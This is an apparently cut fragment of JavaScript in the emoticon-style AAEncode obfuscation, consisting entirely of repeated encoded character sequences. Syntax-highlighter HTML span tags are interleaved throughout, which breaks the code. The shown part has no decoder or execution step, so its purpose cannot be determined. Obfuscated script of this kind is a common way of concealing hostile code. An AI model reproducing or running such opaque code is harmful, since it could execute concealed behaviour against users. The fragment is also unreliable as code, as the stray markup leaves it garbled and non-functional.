(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ 